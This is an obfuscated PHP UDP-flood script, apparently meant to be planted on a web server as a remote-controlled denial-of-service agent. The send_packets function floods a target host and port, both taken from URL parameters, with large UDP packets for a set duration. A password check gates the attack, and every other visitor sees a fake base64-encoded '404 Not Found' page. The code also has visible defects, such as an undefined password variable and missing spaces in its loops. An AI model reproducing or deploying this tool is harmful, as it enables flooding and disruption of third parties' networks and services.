<?php

/*********************************************************************************************************
                          INICIO CONFIGURAÇÕES
*********************************************************************************************************/

// ESSE SCRIPT OFUSCADO AINDA NAO FOI TESTADO
// ESSE SCRIPT OFUSCADO AINDA NAO FOI TESTADO
// ESSE SCRIPT OFUSCADO AINDA NAO FOI TESTADO
// ESSE SCRIPT OFUSCADO AINDA NAO FOI TESTADO
// ESSE SCRIPT OFUSCADO AINDA NAO FOI TESTADO
// ESSE SCRIPT OFUSCADO AINDA NAO FOI TESTADO
// ESSE SCRIPT OFUSCADO AINDA NAO FOI TESTADO
// ESSE SCRIPT OFUSCADO AINDA NAO FOI TESTADO
// ESSE SCRIPT OFUSCADO AINDA NAO FOI TESTADO
// ESSE SCRIPT OFUSCADO AINDA NAO FOI TESTADO
// ESSE SCRIPT OFUSCADO AINDA NAO FOI TESTADO
// ESSE SCRIPT OFUSCADO AINDA NAO FOI TESTADO
// ESSE SCRIPT OFUSCADO AINDA NAO FOI TESTADO

$acess_url = '09K33M3O20D0RFGHM3-DG40!203!212223KFJV9RO04ELR'; //Password - example

error_reporting(0);
ini_set('display_errors',0);
date_default_timezone_set ("America/Sao_Paulo");
set_time_limit(0);
ignore_user_abort(FALSE);

function send_packets($o0,$f1,$w2,$i3=NULL){$l4=0;$n5=time();$v6=$n5+$w2;for($u7=0;$u7<65535;$u7++){$j8.=base64_decode('Vg==');}while(1){$l4++;if(time()>$v6){break;}$e9=fsockopen("udp://$o0",$f1,$ca,$gb,5);if($e9){fwrite($e9,$j8);fclose($e9);}}return base64_decode('KA==').$i3.base64_decode('KVRlc3RlIGNvbmNsdWlkbyBhcyA=').date(base64_decode('SDppOnM='))." com $l4 (".round(($l4*65)/1024,2).base64_decode('IG1CKSBwYWNvdGVzIGVudmlhZG9zIGEgY2VyY2EgZGUg').round($l4/$w2,2).base64_decode('IHBhY290ZXMvcyAK');}function multiRequest($fc,$vd=array()){$ne=array();$uf=array();$o10=curl_multi_init();foreach($fcas $i3=>$v11){$ne[$i3]=curl_init();curl_setopt($ne[$i3],CURLOPT_SSL_VERIFYPEER,false);$m12=(is_array($v11)&&!empty($v11[base64_decode('dXJs')]))?$v11[base64_decode('dXJs')]:$v11;curl_setopt($ne[$i3],CURLOPT_URL,$m12);curl_setopt($ne[$i3],CURLOPT_HEADER,0);curl_setopt($ne[$i3],CURLOPT_RETURNTRANSFER,1);if(is_array($v11)){if(!empty($v11[base64_decode('cG9zdA==')])){curl_setopt($ne[$i3],CURLOPT_POST,1);curl_setopt($ne[$i3],CURLOPT_POSTFIELDS,$v11[base64_decode('cG9zdA==')]);}}if(!empty($vd)){curl_setopt_array($ne[$i3],$vd);}curl_multi_add_handle($o10,$ne[$i3]);}$c13=null;do{curl_multi_exec($o10,$c13);}while($c13>0);foreach($neas $i3=>$j14){$uf[$i3]=curl_multi_getcontent($j14);curl_multi_remove_handle($o10,$j14);}curl_multi_close($o10);return $uf;}

if($_GET[p]===$f0&&$_GET[r]==base64_decode('cw==') &&$_GET[dest]!=NULL &&$_GET[port]!=NULL &&$_GET[time]!=NULL &&$_GET[id]!=NULL){echo send_packets($_GET[dest],$_GET[port],$_GET[time],$_GET[id]);exit;}else{echo base64_decode('DQoNCiAgPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9JRVRGLy9EVEQgSFRNTCAyLjAvL0VOIj4NCiAgPGh0bWw+PGhlYWQ+DQogIDx0aXRsZT40MDQgTm90IEZvdW5kPC90aXRsZT4NCiAgPC9oZWFkPjxib2R5Pg0KICA8aDE+Tm90IEZvdW5kPC9oMT4NCiAgPHA+VGhlIHJlcXVlc3RlZCBVUkwg').$_SERVER[base64_decode('UkVRVUVTVF9VUkk=')].base64_decode('IHdhcyBub3QgZm91bmQgb24gdGhpcyBzZXJ2ZXIuPC9wPg0KICA8cD5BZGRpdGlvbmFsbHksIGEgNDA0IE5vdCBGb3VuZA0KICBlcnJvciB3YXMgZW5jb3VudGVyZWQgd2hpbGUgdHJ5aW5nIHRvIHVzZSBhbiBFcnJvckRvY3VtZW50IHRvIGhhbmRsZSB0aGUgcmVxdWVzdC48L3A+DQogIDwvYm9keT48L2h0bWw+DQoNCiAg');}


?>

